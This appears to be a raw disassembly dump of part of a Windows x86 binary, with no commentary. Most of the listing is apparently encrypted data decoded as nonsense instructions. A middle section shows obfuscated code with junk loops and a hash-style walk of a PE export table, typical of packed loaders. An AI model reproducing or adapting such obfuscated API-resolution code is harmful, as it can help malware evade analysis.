  40cd22:	and    DWORD PTR [ecx-0x68],0x1b3efb0b
  40cd29:	les    ebx,FWORD PTR [ebx+0x9]
  40cd2c:	pop    ss
  40cd2d:	stos   BYTE PTR es:[edi],al
  40cd2e:	or     BYTE PTR [ebx+0x543f8fca],dh
  40cd34:	inc    esi
  40cd35:	outs   dx,BYTE PTR ds:[esi]
  40cd36:	pop    esp
  40cd37:	adc    DWORD PTR [edx-0x58d01854],eax
  40cd3d:	jle    0x40cd0b
  40cd3f:	xchg   esp,eax
  40cd40:	rcl    eax,1
  40cd42:	shr    edx,0x35
  40cd45:	test   al,0x98
  40cd47:	repnz mov ebx,esi
  40cd4a:	push   ecx
  40cd4b:	mov    ah,0x24
  40cd4d:	aam    0xc3
  40cd4f:	dec    ebx
  40cd50:	fcomp  QWORD PTR [eax]
  40cd52:	mov    es,WORD PTR [ebx]
  40cd54:	sbb    ch,dl
  40cd56:	test   al,0x74
  40cd58:	sub    al,0x1f
  40cd5a:	inc    esp
  40cd5b:	adc    eax,0x49adaf74
  40cd60:	xchg   BYTE PTR [esi+0xdec548],cl
  40cd66:	jne    0x40cdae
  40cd68:	xchg   BYTE PTR [ebx+0x18d89e4e],al
  40cd6e:	dec    ebx
  40cd6f:	in     eax,dx
  40cd70:	mov    ebx,0x954b756d
  40cd75:	xor    DWORD PTR [ebx+0x62],ecx
  40cd78:	and    bh,ah
  40cd7a:	leave  
  40cd7b:	cwde   
  40cd7c:	add    dl,al
  40cd7e:	dec    esi
  40cd7f:	loop   0x40cd5b
  40cd81:	push   es
  40cd82:	mov    cs,WORD PTR [esi-0x35]
  40cd85:	outs   dx,DWORD PTR ds:[esi]
  40cd86:	hlt    
  40cd87:	aad    0x81
  40cd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd8a:	add    dl,ah
  40cd8c:	(bad)  
  40cd8d:	loope  0x40cd32
  40cd8f:	sbb    eax,0x9311e13
  40cd94:	dec    esi
  40cd95:	clc    
  40cd96:	jb     0x40cd8e
  40cd98:	mov    esp,0x15360fb6
  40cd9d:	inc    ecx
  40cd9e:	je     0x40ce11
  40cda0:	xor    DWORD PTR [edx],ebp
  40cda2:	call   0xbb746051
  40cda7:	lods   eax,DWORD PTR ds:[esi]
  40cda8:	rcr    edi,1
  40cdaa:	mov    WORD PTR [esi+0x1d880258],cs
  40cdb0:	shl    DWORD PTR [eax],0xb1
  40cdb3:	gs inc edi
  40cdb5:	pop    esp
  40cdb6:	xlat   BYTE PTR ds:[ebx]
  40cdb7:	jl     0x40cdcf
  40cdb9:	enter  0xf8f5,0xde
  40cdbd:	mov    edi,0x6323325f
  40cdc2:	inc    ecx
  40cdc3:	mov    dh,0x26
  40cdc5:	or     BYTE PTR [ebp-0x53027cb3],ch
  40cdcb:	fsubr  QWORD PTR [ecx+0x670335b0]
  40cdd1:	hlt    
  40cdd2:	xor    DWORD PTR [esp+eax*8+0x66],ebp
  40cdd6:	add    BYTE PTR [esi-0x3b6ac17d],0x1
  40cddd:	pop    ecx
  40cdde:	fcom   DWORD PTR [ebx-0x524828d7]
  40cde4:	pop    esp
  40cde5:	adc    ecx,DWORD PTR [ebp+0x4f926873]
  40cdeb:	sbb    ebp,DWORD PTR [eax+0x46]
  40cdee:	adc    ebx,DWORD PTR [eax+esi*2-0x523ea7c9]
  40cdf5:	sahf   
  40cdf6:	not    DWORD PTR [eax]
  40cdf8:	push   0x8f0cf28b
  40cdfd:	jle    0x40cdc4
  40cdff:	jp     0x40cdab
  40ce01:	mov    ds:0x81e00772,al
  40ce06:	xchg   esp,eax
  40ce07:	mov    bl,0xb5
  40ce09:	loopne 0x40ce22
  40ce0b:	fs add al,0xd4
  40ce0e:	shl    bl,0x98
  40ce11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce12:	rcr    esi,1
  40ce14:	sahf   
  40ce15:	cmp    DWORD PTR [edi-0x44],ecx
  40ce18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce19:	push   0xb4db32a0
  40ce1e:	test   DWORD PTR [ecx+ecx*1],esp
  40ce21:	imul   eax,ecx,0x55052e52
  40ce27:	scas   eax,DWORD PTR es:[edi]
  40ce28:	xor    al,0x2e
  40ce2a:	mov    eax,0x32a6bc54
  40ce2f:	call   0x700f:0x6a4e2fe2
  40ce36:	adc    al,0x8e
  40ce38:	cld    
  40ce39:	and    esp,DWORD PTR [ebx]
  40ce3b:	scas   eax,DWORD PTR es:[edi]
  40ce3c:	sahf   
  40ce3d:	dec    eax
  40ce3e:	mov    ds:0x89aad4c9,eax
  40ce43:	cmp    esp,DWORD PTR [eax-0x26]
  40ce46:	hlt    
  40ce47:	cmc    
  40ce48:	xlat   BYTE PTR ds:[ebx]
  40ce49:	cmp    ebx,ebx
  40ce4b:	xchg   edi,eax
  40ce4c:	xor    eax,0x6686267a
  40ce51:	daa    
  40ce52:	arpl   bx,bx
  40ce54:	cmp    bh,ah
  40ce56:	dec    ebp
  40ce57:	inc    eax
  40ce58:	mov    ah,0xce
  40ce5a:	lods   al,BYTE PTR ds:[esi]
  40ce5b:	and    ah,cl
  40ce5d:	retf   
  40ce5e:	shl    DWORD PTR [edi-0x56],cl
  40ce61:	icebp  
  40ce62:	ds mov ecx,0x49be6dc8
  40ce68:	sbb    eax,0xf06441f3
  40ce6d:	jl     0x40ce5a
  40ce6f:	push   0x606fdfcb
  40ce74:	icebp  
  40ce75:	mov    cl,bl
  40ce77:	dec    esi
  40ce78:	in     eax,0x22
  40ce7a:	jb     0x40ce0a
  40ce7c:	cmc    
  40ce7d:	push   eax
  40ce7e:	popa   
  40ce7f:	jle    0x40cec1
  40ce81:	fsub   QWORD PTR [eax]
  40ce83:	inc    ecx
  40ce84:	jno    0x40ce1a
  40ce86:	mov    WORD PTR [esi+esi*4-0x6bac15a1],?
  40ce8d:	and    dh,bl
  40ce8f:	jbe    0x40ce95
  40ce91:	(bad)  
  40ce93:	mov    ebx,0xb179e191
  40ce98:	or     DWORD PTR [ebx+0x5c7fc45],0x428eab
  40cea2:	push   ds
  40cea3:	add    BYTE PTR [eax],al
  40cea5:	add    BYTE PTR [ebx+0x428eab3d],al
  40ceab:	add    BYTE PTR [eax],al
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42a9c3
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42a9cb
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42a9cf
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42a9d3
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42a9d7
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax-0x2456eead]
  40d217:	fisttp WORD PTR [edi]
  40d219:	push   ebp
  40d21a:	rol    BYTE PTR [ebx-0x7c9f0e7d],cl
  40d220:	or     DWORD PTR [esi],0xffffffd5
  40d223:	ins    BYTE PTR es:[edi],dx
  40d224:	sub    al,0x71
  40d226:	jb     0x40d275
  40d228:	ret    
  40d229:	cs neg esp
  40d22c:	push   ds
  40d22d:	dec    ebp
  40d22e:	mov    al,bl
  40d230:	mov    ch,bl
  40d232:	and    eax,0x333815ea
  40d237:	and    esi,DWORD PTR [ebx]
  40d239:	adc    ah,BYTE PTR [eax-0x77]
  40d23c:	push   cs
  40d23d:	inc    ecx
  40d23e:	mov    al,ds:0x2a5c9953
  40d243:	(bad)  
  40d244:	int    0x34
  40d246:	sub    esi,DWORD PTR [edi-0x7]
  40d249:	sub    BYTE PTR [eax+0x636f5daf],0x6f
  40d250:	push   es
  40d251:	jmp    0xd95d5828
  40d256:	jno    0x40d217
  40d258:	add    eax,0x8d34a0bd
  40d25d:	jp     0x40d2c8
  40d25f:	and    al,al
  40d261:	popf   
  40d262:	pushf  
  40d263:	mov    esp,0x30c2091c
  40d268:	jmp    0x40d27b
  40d26a:	pop    ds
  40d26b:	pop    ss
  40d26c:	pop    edx
  40d26d:	push   edi
  40d26e:	cs cmp eax,0xfbbab0c
  40d274:	mov    dh,0x29
  40d276:	pop    ebp
  40d277:	or     al,0xf0
  40d279:	jns    0x40d2dd
  40d27b:	or     eax,0xb31de093
  40d280:	sub    al,0x8
  40d282:	adc    cl,cl
  40d284:	mov    dl,0x85
  40d286:	dec    ecx
  40d287:	mov    dh,0xc6
  40d289:	outs   dx,BYTE PTR ds:[esi]
  40d28a:	or     dh,bl
  40d28c:	enter  0xa64e,0x17
  40d290:	mov    cl,0x60
  40d292:	mov    eax,ds:0x8e5cd9c
  40d297:	sub    al,0x66
  40d299:	lahf   
  40d29a:	xor    al,BYTE PTR [esi]
  40d29c:	lods   al,BYTE PTR ds:[esi]
  40d29d:	aaa    
  40d29e:	add    ecx,eax
  40d2a0:	xor    eax,0xc4d410c6
  40d2a5:	jle    0x40d2f5
  40d2a7:	cdq    
  40d2a8:	cmc    
  40d2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2aa:	xor    ch,BYTE PTR ds:0xfd44837b
  40d2b0:	ja     0x40d313
  40d2b2:	ds cdq 
  40d2b4:	call   0x40a53885
  40d2b9:	adc    DWORD PTR [edi],edi
  40d2bb:	sub    eax,0xc381dab7
  40d2c0:	add    al,0x86
  40d2c2:	pop    es
  40d2c3:	int    0x63
  40d2c5:	dec    ebp
  40d2c6:	lahf   
  40d2c7:	ja     0x40d2ab
  40d2c9:	(bad)  
  40d2ca:	(bad)  
  40d2cb:	call   0x2476:0x2abc3ee
  40d2d2:	mov    ebp,0x97576b0b
  40d2d7:	xchg   esp,eax
  40d2d8:	rcr    BYTE PTR ds:0xcef3da08,0x66
  40d2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e0:	lods   eax,DWORD PTR ds:[esi]
  40d2e1:	rcl    DWORD PTR [ebx-0x5a236780],1
  40d2e7:	cmp    ah,bh
  40d2e9:	call   0xf2a489f5
  40d2ee:	ds (bad) 
  40d2f0:	jbe    0x40d34c
  40d2f2:	ss out 0xf,al
  40d2f5:	mov    ?,edx
  40d2f7:	in     eax,dx
  40d2f8:	leave  
  40d2f9:	sbb    ah,BYTE PTR [ebp-0x7f]
  40d2fc:	and    eax,DWORD PTR [di+0x68]
  40d300:	ror    DWORD PTR [ebp+eiz*4-0xf8d00dc],cl
  40d307:	xchg   esp,eax
  40d308:	push   esi
  40d309:	sub    bh,BYTE PTR [edx+0x37625b77]
  40d30f:	in     eax,0xbe
  40d311:	inc    ebx
  40d312:	nop
  40d313:	xchg   ebx,eax
  40d314:	jo     0x40d336
  40d316:	add    DWORD PTR [edx],edx
  40d318:	add    esp,edx
  40d31a:	push   eax
  40d31b:	fimul  WORD PTR [edi+0x63]
  40d31e:	cwde   
  40d31f:	mov    bh,0xc0
  40d321:	add    DWORD PTR [edx],ebp
  40d323:	loop   0x40d2fa
  40d325:	sbb    ebx,ebx
  40d327:	jl     0x40d34f
  40d329:	aas    
  40d32a:	sti    
  40d32b:	jbe    0x40d300
  40d32d:	add    al,0xa5
  40d32f:	cdq    
  40d330:	cmp    ebx,DWORD PTR ds:0xd35dc326
  40d336:	fdivp  st(0),st
  40d338:	test   al,0x8e
  40d33a:	cmp    DWORD PTR [esi-0xe6f75ff],esp
  40d340:	dec    edi
  40d341:	sti    
  40d342:	mov    ah,al
  40d344:	ss cmp al,0x50
  40d347:	push   ds
  40d348:	push   0x7d
  40d34a:	(bad)  
  40d34b:	ss jp  0x40d2dc
  40d34e:	dec    ecx
  40d34f:	jl     0x40d3b5
  40d351:	ret    0xfcc5
  40d354:	xor    eax,0xda6d5762
  40d359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d35a:	push   esp
  40d35b:	cmc    
  40d35c:	xchg   esp,eax
  40d35d:	lea    edi,[edi]
  40d35f:	inc    eax
  40d360:	(bad)  
  40d361:	sbb    dh,BYTE PTR [ecx-0x1dead57d]
  40d367:	test   eax,0x64f264e0
  40d36c:	shl    BYTE PTR ds:0x902c2f7c,0x62
  40d373:	sbb    eax,0xaa7705a7
  40d378:	and    BYTE PTR [edx+0x7ba98cb1],bh
  40d37e:	fwait
  40d37f:	ror    DWORD PTR [edi-0x6440c65b],1
  40d385:	push   0xffffff85
  40d387:	imul   ebp,DWORD PTR [edx-0x46d72003],0xffffffdb
  40d38e:	sti    
  40d38f:	adc    BYTE PTR [edi-0x2e],bl
  40d392:	(bad)  
  40d394:	call   0x4f62:0x276eb9c0
  40d39b:	test   DWORD PTR [edx+0x3f39fe7c],ebx
  40d3a1:	pop    es
  40d3a2:	enter  0x180d,0x2e
  40d3a6:	inc    eax
  40d3a7:	adc    DWORD PTR [edx-0x17],0x98aab69d
  40d3ae:	addr16 xor al,0x12
  40d3b1:	in     al,0xf9
  40d3b3:	aaa    
  40d3b4:	fst    DWORD PTR [edx-0x2c88c8c5]
  40d3ba:	push   ds
  40d3bb:	mov    esi,0xe9b59e1
  40d3c0:	in     eax,dx
  40d3c1:	fistp  DWORD PTR [edi+0x4e]
  40d3c4:	pusha  
  40d3c5:	adc    al,0xaa
  40d3c7:	dec    ecx
  40d3c8:	cli    
  40d3c9:	pop    eax
  40d3ca:	xor    eax,0xb70f98d4
  40d3cf:	je     0x40d36a
  40d3d1:	adc    BYTE PTR [ebx],0xdb
  40d3d4:	mov    BYTE PTR [ecx+0x28],bl
  40d3d7:	gs cld 
  40d3d9:	lahf   
  40d3da:	nop
  40d3db:	mov    ecx,DWORD PTR [eax]
  40d3dd:	scas   al,BYTE PTR es:[edi]
  40d3de:	xor    BYTE PTR [ebx],dl
  40d3e0:	jmp    0xbef7:0xae4810f2
  40d3e7:	ja     0x40d3cc
  40d3e9:	aam    0x8
  40d3eb:	xor    al,0x74
  40d3ed:	(bad)  
  40d3ee:	mov    ebx,0x8709e47
  40d3f3:	push   edi
  40d3f4:	or     eax,0x4c07ffd8
  40d3f9:	jg     0x40d448
  40d3fb:	popa   
  40d3fc:	push   esi
  40d3fd:	inc    ecx
  40d3fe:	repz lds esi,FWORD PTR [ebx+0x78]
  40d402:	xchg   ebx,eax
  40d403:	push   ebx
  40d404:	and    DWORD PTR [ebx],esi
  40d406:	xchg   ecx,eax
  40d407:	adc    WORD PTR [ebx+0x39],0x44
  40d40c:	sti    
  40d40d:	xchg   ebx,eax
  40d40e:	pop    edi
  40d40f:	fisubr DWORD PTR [ebx+0x6c]
  40d412:	mov    eax,ds:0xf489bf9
  40d417:	dec    ebp
  40d418:	mov    ebx,eax
  40d41a:	xchg   BYTE PTR [edi],cl
  40d41c:	leave  
  40d41d:	(bad)  
  40d41e:	aaa    
  40d41f:	jmp    0x40d3a4
  40d421:	xchg   ebx,eax
  40d422:	jp     0x40d3c4
  40d424:	mov    ch,0xa5
  40d426:	xchg   ebx,eax
  40d427:	into   
  40d428:	xor    eax,0x3b2f9481
  40d42d:	pop    eax
  40d42e:	add    ebx,DWORD PTR [ebx-0x7bdbc457]
  40d434:	loopne 0x40d3db
  40d436:	lods   al,BYTE PTR ds:[esi]
  40d437:	aaa    
  40d438:	leave  
  40d439:	cld    
  40d43a:	xor    eax,0x798c6a88
  40d43f:	add    BYTE PTR [esi-0x68],cl
  40d442:	jg     0x40d47d
  40d444:	adc    ah,BYTE PTR [eax]
  40d446:	adc    ah,BYTE PTR [edi+0x694c76bf]
  40d44c:	push   ebp
  40d44d:	sub    al,0x9
  40d44f:	popa   
  40d450:	and    esi,esp
  40d452:	rcl    ah,1
  40d454:	arpl   WORD PTR [ebp+0x69c7bae7],si
  40d45a:	mov    eax,ds:0x3ffa7116
  40d45f:	add    esi,esp
  40d461:	pop    edx
  40d462:	mov    ?,WORD PTR [eax]
  40d464:	mov    ds:0x8c6b6cb4,al
  40d469:	out    dx,eax
  40d46a:	and    esi,DWORD PTR [ebx+eax*8]
  40d46d:	aas    
  40d46e:	ror    esp,0xc0
  40d471:	and    bh,BYTE PTR [ecx+0x1ecf2c90]
  40d477:	xchg   esi,eax
  40d478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d479:	xchg   BYTE PTR ds:0x80a70226,al
  40d47f:	mov    esi,gs
  40d481:	int    0x3d
  40d483:	test   BYTE PTR [edx-0xddd2b0f],ah
  40d489:	les    esi,FWORD PTR [edx+ecx*2]
  40d48c:	push   ss
  40d48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d48e:	add    cl,ah
  40d490:	mov    bl,0xbf
  40d492:	(bad)  
  40d493:	ds stos BYTE PTR es:[edi],al
  40d495:	inc    esp
  40d496:	xor    dl,BYTE PTR ds:[ecx-0x45]
  40d49a:	ds stos DWORD PTR es:[edi],eax
  40d49c:	push   0xd2bb12c4
  40d4a1:	add    ah,BYTE PTR [edx-0x14ed1ecb]
  40d4a7:	pop    esp
  40d4a8:	jg     0x40d4d6
  40d4aa:	clc    
  40d4ab:	add    ch,BYTE PTR [ebx]
  40d4ad:	arpl   WORD PTR [eax],di
  40d4af:	xor    eax,0x9774b591
  40d4b4:	sbb    esi,DWORD PTR [eax-0x39]
  40d4b7:	mov    bl,0xeb
  40d4b9:	ins    BYTE PTR es:[edi],dx
  40d4ba:	and    DWORD PTR [edx-0x394f2122],ebx
  40d4c0:	cld    
  40d4c1:	(bad)  
  40d4c2:	jb     0x40d46c
  40d4c4:	pop    ds
  40d4c5:	fiadd  DWORD PTR [esi-0x1ea07b9f]
  40d4cb:	push   edi
  40d4cc:	mov    cl,0xf
  40d4ce:	inc    ebx
  40d4cf:	inc    edi
  40d4d0:	stos   BYTE PTR es:[edi],al
  40d4d1:	mov    ds,ebx
  40d4d3:	or     esi,ecx
  40d4d5:	pusha  
  40d4d6:	pop    eax
  40d4d7:	push   es
  40d4d8:	mov    DWORD PTR [eax+0x2d],esp
  40d4db:	and    ebp,edx
  40d4dd:	jg     0x40d488
  40d4df:	rcr    DWORD PTR [ecx],0x5f
  40d4e2:	imul   edi,ebp,0x3015a85d
  40d4e8:	jl     0x40d507
  40d4ea:	dec    eax
  40d4eb:	loopne 0x40d4e7
  40d4ed:	aam    0xfb
  40d4ef:	loope  0x40d528
  40d4f1:	nop
  40d4f2:	dec    eax
  40d4f3:	push   esi
  40d4f4:	push   esi
  40d4f5:	xchg   ecx,eax
  40d4f6:	push   ebx
  40d4f7:	xchg   DWORD PTR [esi],ebp
  40d4f9:	push   eax
  40d4fa:	cmc    
  40d4fb:	xor    DWORD PTR [ebp+0x12776491],esi
  40d501:	arpl   WORD PTR [edx],cx
  40d503:	jb     0x40d52c
  40d505:	inc    eax
  40d506:	add    al,BYTE PTR [edi-0x58]
  40d509:	push   0xffffffed
  40d50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d50c:	jmp    0x40d51b
  40d50e:	rol    DWORD PTR [edi+0x842eca8],0x77
  40d515:	push   ss
  40d516:	neg    BYTE PTR [edx+esi*4-0x75]
  40d51a:	sbb    BYTE PTR [ebx],cl
  40d51c:	pop    ebp
  40d51d:	or     esi,DWORD PTR [edx-0x6]
  40d520:	fmulp  st(5),st
  40d522:	pop    ds
  40d523:	popf   
  40d524:	xor    DWORD PTR [esi-0x20],eax
  40d527:	adc    BYTE PTR [edx+edi*2-0x7c],bh
  40d52b:	mov    edx,0x66ac6ecc
  40d530:	jl     0x40d568
  40d532:	idiv   DWORD PTR [edi+0x3a308503]
  40d538:	retf   0xf75c
  40d53b:	jb     0x40d4c7
  40d53d:	push   ss
  40d53e:	cs sub eax,0xd5525c7e
  40d544:	cli    
  40d545:	add    al,0x47
  40d547:	push   cs
  40d548:	sub    BYTE PTR [ecx],0x88
  40d54b:	sbb    BYTE PTR [ecx+0x399163f7],ch
  40d551:	and    eax,0x885cfbaf
  40d556:	enter  0xa372,0x43
  40d55a:	xchg   DWORD PTR [esi*1-0x492989d7],ecx
  40d561:	arpl   WORD PTR [esi+0x20],bp
  40d564:	in     eax,0xd
  40d566:	push   eax
  40d567:	mov    eax,0x33a06906
  40d56c:	xor    dh,BYTE PTR [esi]
  40d56e:	mov    ah,0xa5
  40d570:	xor    eax,0xcc7bed5e
  40d575:	imul   eax,DWORD PTR [ebx+esi*2+0x1d],0xfa435356
  40d57d:	repnz push 0xffffffd0
  40d580:	loopne 0x40d5cf
  40d582:	in     al,dx
  40d583:	scas   al,BYTE PTR es:[edi]
  40d584:	adc    al,0xe1
  40d586:	call   0x713f:0xef3ac757
  40d58d:	dec    eax
  40d58e:	mov    esp,0x32ac10ed
  40d593:	jmp    0xdd22:0x2faef7a
  40d59a:	fiadd  WORD PTR [edx-0x5a65a26b]
  40d5a0:	sub    dl,BYTE PTR [esi]
  40d5a2:	push   cs
  40d5a3:	push   cs
  40d5a4:	cwde   
  40d5a5:	cld    
  40d5a6:	dec    ebx
  40d5a7:	int3   
  40d5a8:	adc    ecx,ebx
  40d5aa:	jno    0x40d59c
  40d5ac:	lahf   
  40d5ad:	imul   esp,edx,0x96bb859c
  40d5b3:	or     BYTE PTR [ecx+0x55],bl
  40d5b6:	sub    dl,BYTE PTR [esi-0xe]
  40d5b9:	xchg   edx,eax
  40d5ba:	(bad)  
  40d5bb:	pop    esi
  40d5bc:	push   edi
  40d5bd:	or     ch,BYTE PTR [ecx]
  40d5bf:	jecxz  0x40d5ee
  40d5c1:	mov    eax,ds:0xc2667a06
  40d5c6:	aas    
  40d5c7:	add    cl,BYTE PTR [ecx-0x4429abf7]
  40d5cd:	mov    edx,0x1280440
  40d5d2:	shl    BYTE PTR [eax],cl
  40d5d4:	imul   eax,DWORD PTR [ebp+0x17],0x26e29428
  40d5db:	push   eax
